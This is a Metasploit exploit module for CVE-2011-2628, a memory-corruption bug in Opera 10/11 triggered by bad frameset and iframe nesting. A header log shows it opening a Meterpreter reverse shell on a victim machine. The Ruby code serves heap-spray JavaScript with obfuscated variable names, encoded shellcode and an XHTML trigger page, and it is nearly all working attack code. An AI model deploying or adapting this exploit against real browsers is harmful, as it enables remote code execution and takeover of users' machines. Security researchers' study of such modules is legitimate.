##############################################################################################################
# Exploit for Opera 10/11 (bad nesting with frameset tag) Memory Corruption
#
# Vulnerability:
#
# Discovered: 2010-08-18
# Patched: 2011-05-18
# Tested on: v10.xx (v10.00, v10.01, v10.10, v10.50, v10.51, v10.52, v10.53, v10.54, v10.6, v10.61, v10.62 and v10.63)
#                           v11.xx < v11.11 (v11.00, v11.01 and v11.10)
# Patched on: v11.11
#
# Exploit:
#
# Coded: 2010-09-23
# Last revision: 2011-09-30
#
# RCE on: v10.00, v10.50, v10.51, v10.52, v10.54, v10.60, v10.62, v11.00, v11.01 and v11.10*
# DoS on: v10.01, v10.10, v10.53, v10.61 and v10.63
#
# Notes:
#
#   1) DEP bypass: possible but unreliable.
#   2) Let me know if you improve this one ;)
#   3) Most of times, it won't work at first attempt and need crash-dialog interaction.
#
# Credits: Jose A. Vazquez of http://spa-s3c.blogspot.com
#
# Greets to: Ruben, Sinn3r, Metasploit Team, Corelan Team, etc
#
# Running against Opera v10.62...
#
#
#        =[ metasploit v4.0.1-dev [core:4.0 api:1.0]
# + -- --=[ 741 exploits - 378 auxiliary - 82 post
# + -- --=[ 228 payloads - 27 encoders - 8 nops
#        =[ svn r13801 updated 3 days ago (2011.09.27)
#
# msf > use windows/browser/opera_frameset_tag
# msf  exploit(opera_frameset_tag) > set payload windows/meterpreter/reverse_tcp
# payload => windows/meterpreter/reverse_tcp
# msf  exploit(opera_frameset_tag) > set LHOST 192.168.1.103
# LHOST => 192.168.1.103
# msf  exploit(opera_frameset_tag) > exploit
# [*] Exploit running as background job.
#
# [*] Started reverse handler on 192.168.1.103:4444
# msf  exploit(opera_frameset_tag) >
# [*] Using URL: http://0.0.0.0:8080/sUpFmezLW6jS
# [*]  Local IP: http://192.168.1.103:8080/sUpFmezLW6jS
# [*] Server started.
# [*] Sending Opera 10/11 (bad nesting with frameset tag) Memory Corruption to 192.168.1.104:1185 (target: Opera Browser (v10.6x - v11.xx) / Windows XP SP3 (DEP-default))
# [*] Sending stage 1 (Spraying the heap)
# [*] Sending stage 2 (Triggering the vulnerability)
# [*] Sending stage 2 (Triggering the vulnerability)
# [*] Sending stage 2 (Triggering the vulnerability)
# [*] Sending stage (752128 bytes) to 192.168.1.104
# [*] Meterpreter session 1 opened (192.168.1.103:4444 -> 192.168.1.104:1190) at 2011-09-30 19:23:28 +0200
# Interrupt: use the 'exit' command to quit
# msf  exploit(opera_frameset_tag) > sessions
#
# Active sessions
# ===============
#
#   Id  Type                   Information                              Connection
#   --  ----                   -----------                              ----------
#   1   meterpreter x86/win32  0XDE1-A39ED4C12\0xde1 @ 0XDE1-A39ED4C12  192.168.1.103:4444 -> 192.168.1.104:1190
#
# msf  exploit(opera_frameset_tag) > sessions -i 1
# [*] Starting interaction with 1...
#
# meterpreter > getuid
# Server username: 0XDE1-A39ED4C12\0xde1
# meterpreter > execute -f  calc.exe
# Process 1336 created.
# meterpreter > exit
# [*] Shutting down Meterpreter...
# msf  exploit(opera_frameset_tag) >
#
################################################################################################################
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
 
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
     
    def initialize(info = {})
     
        super(update_info(info,
            'Name'           => 'Opera 10/11 (bad nesting with frameset tag) Memory Corruption',
            'Description'    => %q{
             
                This module exploits a vulnerability in the nesting of frameset and iframe tags as implemented within
                Opera Browser. A memory corruption is triggered and some pointers got corrupted with invalid addresses.
                Successfully exploiting leads to remote code execution or denial of service condition under Windows XP
                SP3 (DEP = off).
                 
                Note than most of cases, it won't work at first attempt and need crash-dialog interaction.
                Read the last reference for further details.
                 
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Jose A. Vazquez'
                ],
            'Version'        => '$Revision: 0011 $',
            'References'     =>
                [
                    ['CVE', '2011-2628'],
                    ['OSVDB', '72406'],
                    ['BID', '47906'],
                    ['URL', 'http://www.opera.com/support/kb/view/992/'],
                    ['URL', 'http://www.beyondsecurity.com/ssd.html'],
                    ['URL', 'http://spa-s3c.blogspot.com/2011/05/spas3c-sv-004opera-browser-1111.html'],
                    ['URL', 'http://spa-s3c.blogspot.com/2011/09/spas3c-sv-004reliability-tests-ssd.html']
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC'          => 'process',
                    'HTTP::compression' => 'gzip',
                    'HTTP::chunked'     => true
                },
            'Payload'        =>
                {
                    'Space'    => 1000,
                    'BadChars' => "\x00",
                    'Compat'   =>
                        {
                            'ConnectionType' => '-find',
                        },
                    'StackAdjustment' => -3500
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    # Automatic
                    [ 'Automatic',
                        {}
                    ],
                     
                    # Opera > v10.54 ~ spray of 350 MB
                    [ 'Opera Browser (v10.6x - v11.xx) / Windows XP SP3 (DEP-default)', 
                        {
                            'SizeofSpray' => 700,
                            'Ret' => 0x0c0c0c0c
                        }
                    ],
                     
                    # Opera <= v10.54 ~ spray of 250 MB
                    [ 'Opera Browser (v10.50 - v10.54) / Windows XP SP3 (DEP-default)', 
                        {
                            'SizeofSpray' => 500,
                            'Ret' => 0x0c0c0c0c
                        }
                    ],
                     
                    # Opera < v10.50 doesn't get crashed with previous method and it needs this one.
                    [ 'Opera Browser (v10.00 - v10.10) / Windows XP SP3 (DEP-default)', 
                        {
                            'SizeofSpray' => 500,
                            'Ret' => 0x0c0c0c0c
                        }
                    ]
                ],
            'DisclosureDate' => '5 October 2011',
            'DefaultTarget'  => 0))
             
    end
     
    #I don't know if Msf::Exploit::Remote::BrowserAutopwn works, but I'm going to include my own auto-target selection
     
    def automatic_target(cli, request)
 
        thistarget = nil
     
        agent = request.headers['User-Agent']
 
        if agent =~ /Version\/10\.00/ or agent =~ /Version\/10\.01/ or agent =~ /Version\/10\.10/
            thistarget = targets[3]
        elsif agent =~ /Version\/10\.50/ or agent =~ /Version\/10\.51/ or agent =~ /Version\/10\.52/ or agent =~ /Version\/10\.53/ or agent =~ /Version\/10\.54/
            thistarget = targets[2]
        else
            thistarget = targets[1]
        end
         
        thistarget
         
    end
     
    def on_request_uri(cli, request)
     
        mytarget = target
         
        if target.name == 'Automatic'
            mytarget = automatic_target(cli, request)
        end
     
        if(request.uri =~ /\.xhtml$/)
         
            #Send file for trigger the vulnerability for cases > v10.10     
                 
            html = %Q|
                    <html xmlns="http://www.w3.org/1999/xhtml" xmlns:xht="http://www.w3.org/1999/xhtml">
                    <meta http-equiv="refresh" content="0;url=" />   
                        <xht:frameset>
                            <xht:iframe>
                                <xht:script>
                                rbc
                                </xht:script>
                                <style type="text/css">
                                    <!-- /* padding CSS */
 
                                    approx:root{   
                                        font: 333em;
                                    }
                                    -->
                                </style>
                            </xht:iframe>
                        </xht:frameset>
                    </html>
                |
         
            #Send triggerer
         
            print_status("Sending stage 2 (Triggering the vulnerability)")
             
            var_contentype = 'application/xhtml+xml'
             
        else
             
            #Send payload + hide iframe for trigger the vuln
         
            #Re-generate the payload
         
            return if ((p = regenerate_payload(cli)) == nil)
             
            #Encode the shellcode
             
            shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(mytarget.arch))
             
            #Ret
             
            addr_word  = [mytarget.ret].pack('V').unpack('H*')[0][0,4]
             
            #Randomize the javascript variable names
             
            var_buffer      =   rand_text_alpha(rand(30)+2)
            var_shellcode   =   rand_text_alpha(rand(30)+2)
            var_unescape    =   rand_text_alpha(rand(30)+2)
            var_x           =   rand_text_alpha(rand(30)+2)
            var_i           =   rand_text_alpha(rand(30)+2)
 
            var_size        =   rand_text_alpha(rand(30)+2)
            var_nopsize     =   rand_text_alpha(rand(30)+2)
            var_limit       =   rand_text_alpha(rand(30)+2)
             
            var_function_trigger    =   rand_text_alpha(rand(30)+2)
            var_file_trigger    =   rand_text_alpha(rand(30)+2)
             
            var_timer_trigger = (rand(3) + 2) * 1000
             
            #Build the exploit
             
            var_url =  ((datastore['SSL']) ? "https://" : "http://")
            var_url << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST'])
            var_url << ":" + datastore['SRVPORT']
            var_url << get_resource
             
            #Sending init HTML
            print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})")
             
            if mytarget.name =~ /v10.00/
             
            # Case v10.00 - v10.10
             
                html = %Q|
                    <html xmlns="http://www.w3.org/1999/xhtml" xmlns:xht="http://www.w3.org/1999/xhtml">
                        <xht:frameset>
                            <xht:iframe>
                                <xht:script>
                                    aaaaaa
                                </xht:script>
                            </xht:iframe>
                        </xht:frameset>
                        <script type="text/javascript">
                            <![CDATA[
                                var #{var_unescape}  = unescape;
                                var #{var_shellcode} = #{var_unescape}("#{shellcode}");
 
                                var #{var_size} = #{var_shellcode}.length * 2;
                                var #{var_nopsize} = 0x100000 - (#{var_size} + 0x14);
                                var #{var_buffer} = #{var_unescape}("%u#{addr_word}");
                                                         
                                while ( #{var_buffer}.length * 2 < #{var_nopsize} ) {
                                    #{var_buffer} += #{var_buffer};
                                }
 
                                var #{var_x} = new Array();
                                     
                                for ( var #{var_i} =0; #{var_i} < #{mytarget['SizeofSpray']}; #{var_i}++ ) {
                                    #{var_x}[ #{var_i} ] = #{var_buffer} + #{var_shellcode};
                                }
                                setInterval("location.reload()", 500);
                            ]]>
                        </script>
                    <html>
                    |  
         
                print_status("Sending simple stage (Sprayer and Triggerer)")
                var_contentype = 'application/xhtml+xml'
             
            else
             
            # Case > v10.10
             
                html = %Q|
                        <html>
                            <head>
                                <script type="text/javascript">
                                    var #{var_unescape}  = unescape;
                                    var #{var_shellcode} = #{var_unescape}("#{shellcode}");
 
                                    var #{var_size} = #{var_shellcode}.length * 2;
                                    var #{var_nopsize} = 0x100000 - (#{var_size} + 0x14);
                                    var #{var_buffer} = #{var_unescape}("%u#{addr_word}");
                                                     
                                    while ( #{var_buffer}.length * 2 < #{var_nopsize} ) {
                                        #{var_buffer} += #{var_buffer};
                                    }
 
                                    var #{var_x} = new Array();
                                     
                                    for ( var #{var_i} =0; #{var_i} < #{mytarget['SizeofSpray']}; #{var_i}++ ) {
                                        #{var_x}[ #{var_i} ] = #{var_buffer} + #{var_shellcode};
                                    }
                                     
                                    function #{var_function_trigger}(){
                                        document.write("<iframe src='#{var_url}/#{var_file_trigger}.xhtml'></iframe>");
                                    }
                                     
                                    setTimeout('#{var_function_trigger}()',#{var_timer_trigger});
                                     
                                </script>
                            </head>
                        <html>
                    |  
                     
                print_status("Sending stage 1 (Spraying the heap)")
                var_contentype = 'text/html'
                 
            end
                 
        end
     
        #Response
        send_response(cli, html, { 'Content-Type' => var_contentype, 'Pragma' => 'no-cache' })
        #Handle the payload        
        handler(cli)
         
    end
     
end
